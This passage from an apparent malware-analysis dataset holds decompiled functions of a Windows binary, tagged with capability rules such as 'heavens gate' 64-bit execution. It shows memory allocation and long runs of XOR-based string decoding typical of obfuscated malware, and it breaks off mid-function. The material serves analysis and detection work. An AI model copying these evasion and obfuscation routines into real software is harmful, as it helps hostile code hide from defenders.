        "decompiled_code": "\nulong __cdecl fcn.0040eb1d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040f4d5(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.0040e650(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00402d23(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 581
    },
    "0040754b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040754b(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    int32_t iVar26;\n    int32_t iVar27;\n    int32_t iVar28;\n    int32_t iVar29;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar var_4h;\n    uint var_3h;\n    \n    var_18h._0_1_ = 0x1a;\n    var_18h._1_1_ = 0x20;\n    var_18h._2_2_ = 0xb74;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0xc;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 0x20;\n    var_10h._0_1_ = 99;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 8;\n    var_ch._0_1_ = 0x27;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 0x45;\n    var_ch._3_1_ = 0x10;\n    var_34h = 6;\n    var_8h._0_1_ = 6;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x25;\n    var_8h._3_1_ = 0x20;\n    var_4h = 0x50;\n    var_3h._0_1_ = 0x1c;\n    var_3h._1_1_ = 0x70;\n    var_28h = 0x79374549;\n    var_24h._0_2_ = 0x6d70;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar29 = 0;\n    do {\n        puVar1 = iVar29 + iVar5;\n        iVar6 = iVar29 % var_34h;\n        iVar29 = iVar29 + 1;\n        *puVar1 = *(&var_28h + iVar6) ^ puVar1[&var_18h - iVar5];\n    } while (iVar29 < 0x17);\n    fcn.0040b2ab();\n    var_20h._0_1_ = 0x32;\n    var_20h._1_1_ = 0x56;\n    var_20h._2_1_ = 0x27;\n    var_20h._3_1_ = 0x35;\n    var_1ch = 0x854083b;\n    var_18h._0_1_ = 0x16;\n    var_18h._1_1_ = 0x3a;\n    var_18h._2_2_ = 0x5e08;\n    var_14h._0_1_ = 7;\n    var_14h._1_1_ = 0x34;\n    var_14h._2_1_ = 0x31;\n    var_14h._3_1_ = 0x35;\n    var_10h._0_1_ = 0x5c;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x31;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0xf;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0x21;\n    var_8h._1_1_ = 0xd;\n    var_8h._2_1_ = 0x56;\n    var_8h._3_1_ = 1;\n    var_4h = 0x23;\n    var_3h._0_1_ = 0x48;\n    var_98h = 0x46663361;\n    var_94h._0_1_ = 0x48;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar29 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_38h = 5;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar29;\n        iVar7 = iVar6 % 5;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_98h + iVar7) ^ puVar1[&var_20h - iVar29];\n    } while (iVar6 < 0x1e);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 0x6a;\n    var_18h._1_1_ = 0x31;\n    var_18h._2_2_ = 0x2b74;\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x74;\n    var_14h._3_1_ = 0x31;\n    var_10h._0_1_ = 0x55;\n    var_10h._1_1_ = 0x2b;\n    var_10h._2_1_ = 0x18;\n    var_10h._3_1_ = 0x1f;\n    var_ch._0_1_ = 0x69;\n    var_ch._1_1_ = 0x26;\n    var_ch._2_1_ = 0x51;\n    var_ch._3_1_ = 0x32;\n    var_8h._0_1_ = 3;\n    var_8h._1_1_ = 10;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0x33;\n    var_4h = 0x5d;\n    var_3h._0_1_ = 0x44;\n    var_28h = 0x44385439;\n    var_24h._0_2_ = 0x666a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    var_98h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + var_98h;\n        iVar7 = iVar6 % var_34h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_28h + iVar7) ^ puVar1[&var_18h - var_98h];\n    } while (iVar6 < 0x16);\n    fcn.0040b2ab();\n    var_1ch = 0x2b0a221a;\n    var_18h._0_1_ = 0x37;\n    var_18h._1_1_ = 0x19;\n    var_18h._2_2_ = 0x262c;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 0x20;\n    var_14h._2_1_ = 5;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x26;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x22;\n    var_10h._3_1_ = 0x15;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x2e;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 0xe;\n    var_4h = 0x49;\n    var_28h = 0x45434749;\n    var_24h._0_2_ = 0x6b54;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar6;\n        iVar8 = iVar7 % var_34h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_28h + iVar8) ^ puVar1[&var_1ch - iVar6];\n    } while (iVar7 < 0x19);\n    fcn.0040b2ab();\n    var_1ch = 0x29321f01;\n    var_18h._0_1_ = 0x2b;\n    var_18h._1_1_ = 0x3c;\n    var_18h._2_2_ = 0x133e;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x2e;\n    var_14h._2_1_ = 0x2c;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0x2d;\n    var_ch._1_1_ = 0x27;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 8;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 0x31;\n    var_8h._2_1_ = 0x31;\n    var_8h._3_1_ = 0x3f;\n    var_4h = 0x37;\n    var_3h._0_1_ = 0x1d;\n    var_3h._1_1_ = 2;\n    var_3h._2_1_ = 0x47;\n    var_28h = 0x47677a52;\n    var_24h._0_2_ = 0x5358;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar7;\n        iVar9 = iVar8 % var_34h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_28h + iVar9) ^ puVar1[&var_1ch - iVar7];\n    } while (iVar8 < 0x1c);\n    fcn.0040b2ab();\n    var_1ch = 0x17232361;\n    var_18h._0_1_ = 0x13;\n    var_18h._1_1_ = 0x18;\n    var_18h._2_2_ = 0x285b;\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 0x37;\n    var_14h._2_1_ = 0x13;\n    var_14h._3_1_ = 0x13;\n    var_10h._0_1_ = 0x5d;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x5b;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 0x15;\n    var_8h._3_1_ = 0x17;\n    var_4h = 0x57;\n    var_3h._0_1_ = 0x46;\n    var_28h = 0x766e4632;\n    var_24h._0_2_ = 0x7070;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar8;\n        iVar10 = iVar9 % var_34h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_28h + iVar10) ^ puVar1[&var_1ch - iVar8];\n    } while (iVar9 < 0x1a);\n    fcn.0040b2ab();\n    var_10h._0_1_ = 0x3d;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 9;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 1;\n    var_8h._0_1_ = 0x20;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 0x28;\n    var_4h = 0xf;\n    var_3h._0_1_ = 0x33;\n    var_3h._1_1_ = 0x6b;\n    var_90h = 0x56684d6e;\n    var_8ch._0_1_ = 0x6b;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar10 = 0;\n    do {\n        puVar1 = iVar10 + iVar9;\n        iVar11 = iVar10 % var_38h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_90h + iVar11) ^ puVar1[&var_10h - iVar9];\n    } while (iVar10 < 0xf);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 0x12;\n    var_14h._3_1_ = 0x51;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0x24;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 5;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0x4d;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0xd;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 0x28;\n    var_8h._3_1_ = 0x58;\n    var_4h = 0x30;\n    var_3h._0_1_ = 0x36;\n    var_3h._1_1_ = 1;\n    var_3h._2_1_ = 0x6c;\n    var_28h = 0x34416c64;\n    var_24h._0_2_ = 0x5155;\n    var_ch._2_1_ = var_10h._3_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar10 = 0;\n    do {\n        puVar1 = iVar10 + var_90h;\n        iVar11 = iVar10 % var_34h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_28h + iVar11) ^ puVar1[&var_14h - var_90h];\n    } while (iVar10 < 0x14);\n    fcn.0040b2ab();\n    var_1ch = 0x161c0e37;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 1;\n    var_18h._2_2_ = 0x3f24;\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0xf;\n    var_14h._2_1_ = 0x16;\n    var_14h._3_1_ = 0x18;\n    var_10h._0_1_ = 0x20;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0x1a;\n    var_10h._3_1_ = 0x34;\n    var_ch._0_1_ = 0x19;\n    var_ch._1_1_ = 0x21;\n    var_ch._2_1_ = 1;\n    var_ch._3_1_ = 3;\n    var_8h._0_1_ = 8;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0x2f;\n    var_8h._3_1_ = 0x12;\n    var_4h = 0x6a;\n    var_88h = 0x77486b64;\n    var_84h._0_1_ = 0x6a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + iVar10;\n        iVar12 = iVar11 % var_38h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_88h + iVar12) ^ puVar1[&var_1ch - iVar10];\n    } while (iVar11 < 0x19);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 0x12;\n    var_18h._1_1_ = 0x3c;\n    var_18h._2_2_ = 0x222b;\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 5;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x3b;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x11;\n    var_ch._1_1_ = 0x2b;\n    var_ch._2_1_ = 0xe;\n    var_ch._3_1_ = 0x3b;\n    var_8h._0_1_ = 0x2c;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 0x24;\n    var_8h._3_1_ = 0x3e;\n    var_4h = 2;\n    var_3h._0_1_ = 0x4d;\n    var_28h = 0x4d675941;\n    var_24h._0_2_ = 0x5745;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    var_88h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + var_88h;\n        iVar12 = iVar11 % var_34h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_28h + iVar12) ^ puVar1[&var_18h - var_88h];\n    } while (iVar11 < 0x16);\n    fcn.0040b2ab();\n    var_1ch = 0x1565040a;\n    var_18h._0_1_ = 0x42;\n    var_18h._1_1_ = 0x2e;\n    var_18h._2_2_ = 0xc3c;\n    var_14h._0_1_ = 0x66;\n    var_14h._1_1_ = 0x1e;\n    var_14h._2_1_ = 0x5e;\n    var_14h._3_1_ = 0x3c;\n    var_10h._0_1_ = 0x30;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 0x53;\n    var_10h._3_1_ = 0x3c;\n    var_ch._0_1_ = 0x43;\n    var_ch._1_1_ = 0x33;\n    var_ch._2_1_ = 0x2f;\n    var_ch._3_1_ = 8;\n    var_8h._0_1_ = 0x5a;\n    var_8h._1_1_ = 9;\n    var_8h._2_1_ = 0x56;\n    var_8h._3_1_ = 0x3f;\n    var_4h = 0x59;\n    var_28h = 0x6c366159;\n    var_24h._0_2_ = 0x5a31;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + iVar11;\n        iVar13 = iVar12 % var_34h;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_28h + iVar13) ^ puVar1[&var_1ch - iVar11];\n    } while (iVar12 < 0x19);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 100;\n    var_18h._1_1_ = 0x14;\n    var_18h._2_2_ = 0x1c24;\n    var_14h._0_1_ = 0x35;\n    var_14h._1_1_ = 0x43;\n    var_14h._2_1_ = 0x14;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0x11;\n    var_10h._1_1_ = 0x2f;\n    var_10h._2_1_ = 0x5a;\n    var_10h._3_1_ = 0x14;\n    var_ch._0_1_ = 0x27;\n    var_ch._1_1_ = 0x17;\n    var_ch._2_1_ = 0x2f;\n    var_ch._3_1_ = 0x41;\n    var_8h._0_1_ = 0x18;\n    var_8h._1_1_ = 0x1b;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0x21;\n    var_4h = 0x52;\n    var_3h._0_1_ = 0x71;\n    var_80h = 0x65777137;\n    var_7ch._0_1_ = 0x46;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + iVar12;\n        iVar14 = iVar13 % var_38h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_80h + iVar14) ^ puVar1[&var_18h - iVar12];\n    } while (iVar13 < 0x16);\n    fcn.0040b2ab();\n    var_20h._0_1_ = 6;\n    var_20h._1_1_ = 7;\n    var_20h._2_1_ = 0;\n    var_20h._3_1_ = 0x19;\n    var_1ch = 0x3c0b333c;\n    var_18h._0_1_ = 0xe;\n    var_18h._1_1_ = 0;\n    var_18h._2_2_ = 0xc3c;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 5;\n    var_10h._0_1_ = 0x10;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 8;\n    var_10h._3_1_ = 0x36;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x11;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x19;\n    var_8h._0_1_ = 0x3a;\n    var_8h._1_1_ = 0x23;\n    var_8h._2_1_ = 0xb;\n    var_8h._3_1_ = 0x3c;\n    var_4h = 0xe;\n    var_3h._0_1_ = 0x34;\n    var_3h._1_1_ = 0x30;\n    var_3h._2_1_ = 0x62;\n    var_78h = 0x6b506255;\n    var_74h._0_1_ = 0x53;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    var_80h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + var_80h;\n        iVar14 = iVar13 % var_38h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_78h + iVar14) ^ puVar1[&var_20h - var_80h];\n    } while (iVar13 < 0x20);\n    fcn.0040b2ab();\n    var_20h._0_1_ = 0x24;\n    var_20h._1_1_ = 0x35;\n    var_20h._2_1_ = 0x7d;\n    var_20h._3_1_ = 0x2d;\n    var_1ch = 0x31123a12;\n    var_18h._0_1_ = 0x47;\n    var_18h._1_1_ = 0x26;\n    var_18h._2_2_ = 0x2933;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x35;\n    var_14h._2_1_ = 100;\n    var_14h._3_1_ = 0x31;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x27;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x40;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x3a;\n    var_8h._0_1_ = 0x1e;\n    var_8h._1_1_ = 0x26;\n    var_8h._2_1_ = 0x5d;\n    var_8h._3_1_ = 0x2f;\n    var_4h = 0x14;\n    var_3h._0_1_ = 0x2f;\n    var_3h._1_1_ = 0x12;\n    var_3h._2_1_ = 0x50;\n    var_28h = 0x43345077;\n    var_24h._0_2_ = 0x4871;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + var_78h;\n        iVar14 = iVar13 % var_34h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_28h + iVar14) ^ puVar1[&var_20h - var_78h];\n    } while (iVar13 < 0x20);\n    fcn.0040b2ab();\n    var_1ch = 0x4210a1b;\n    var_18h._0_1_ = 0x21;\n    var_18h._1_1_ = 0x24;\n    var_18h._2_2_ = 0xa3c;\n    var_14h._0_1_ = 0x32;\n    var_14h._1_1_ = 0x17;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x20;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 6;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x13;\n    var_ch._0_1_ = 0x14;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x19;\n    var_8h._0_1_ = 0xb;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 0x21;\n    var_8h._3_1_ = 0x22;\n    var_4h = 0x2d;\n    var_3h._0_1_ = 0x6f;\n    var_28h = 0x76626f48;\n    var_24h._0_2_ = 0x4544;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar14 = 0;\n    do {\n        puVar1 = iVar14 + iVar13;\n        iVar15 = iVar14 % var_34h;\n        iVar14 = iVar14 + 1;\n        *puVar1 = *(&var_28h + iVar15) ^ puVar1[&var_1ch - iVar13];\n    } while (iVar14 < 0x1a);\n    fcn.0040b2ab();\n    var_1ch = 0x37762e1a;\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x28;\n    var_18h._2_2_ = 0x503f;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x26;\n    var_10h._0_1_ = 0x54;\n    var_10h._1_1_ = 0x2b;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x65;\n    var_ch._2_1_ = 0x37;\n    var_ch._3_1_ = 5;\n    var_8h._0_1_ = 0x3f;\n    var_8h._1_1_ = 0x22;\n    var_8h._2_1_ = 0x59;\n    var_8h._3_1_ = 0x20;\n    var_4h = 0xb;\n    var_3h._0_1_ = 0x2c;\n    var_3h._1_1_ = 0x4b;\n    var_40h = 0x45354b49;\n    var_3ch._0_1_ = 0x6c;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar15 = 0;\n    do {\n        puVar1 = iVar15 + iVar14;\n        iVar16 = iVar15 % var_38h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_40h + iVar16) ^ puVar1[&var_1ch - iVar14];\n    } while (iVar15 < 0x1b);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 0x10;\n    var_14h._1_1_ = 0x29;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0x29;\n    var_10h._0_1_ = 0x2a;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x3c;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x12;\n    var_8h._0_1_ = 0x2a;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x2f;\n    var_4h = 0x2c;\n    var_3h._0_1_ = 100;\n    var_28h = 0x48624c43;\n    var_24h._0_2_ = 0x6449;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    var_40h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar15 = 0;\n    do {\n        puVar1 = iVar15 + var_40h;\n        iVar16 = iVar15 % var_34h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_28h + iVar16) ^ puVar1[&var_14h - var_40h];\n    } while (iVar15 < 0x12);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 0x38;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x1b;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 4;\n    var_10h._3_1_ = 0x1f;\n    var_ch._0_1_ = 0x2c;\n    var_ch._1_1_ = 0x19;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x1d;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x25;\n    var_8h._3_1_ = 0x2c;\n    var_4h = 0x11;\n    var_3h._0_1_ = 0x2e;\n    var_3h._1_1_ = 0x6b;\n    var_28h = 0x49496d6b;\n    var_24h._0_2_ = 0x4b76;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar16 = 0;\n    do {\n        puVar1 = iVar16 + iVar15;\n        iVar17 = iVar16 % var_34h;\n        iVar16 = iVar16 + 1;\n        *puVar1 = *(&var_28h + iVar17) ^ puVar1[&var_14h - iVar15];\n    } while (iVar16 < 0x13);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x32;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x4c;\n    var_10h._1_1_ = 0x27;\n    var_10h._2_1_ = 0x37;\n    var_10h._3_1_ = 0xe;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x57;\n    var_ch._2_1_ = 3;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 8;\n    var_8h._1_1_ = 0x35;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x3f;\n    var_4h = 0x36;\n    var_3h._0_1_ = 6;\n    var_3h._1_1_ = 0x26;\n    var_3h._2_1_ = 0x39;\n    var_68h = 0x43615353;\n    var_64h._0_1_ = 0x39;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + iVar16;\n        iVar18 = iVar17 % var_38h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_68h + iVar18) ^ puVar1[&var_14h - iVar16];\n    } while (iVar17 < 0x14);\n    fcn.0040b2ab();\n    var_10h._1_1_ = 6;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 0x2b;\n    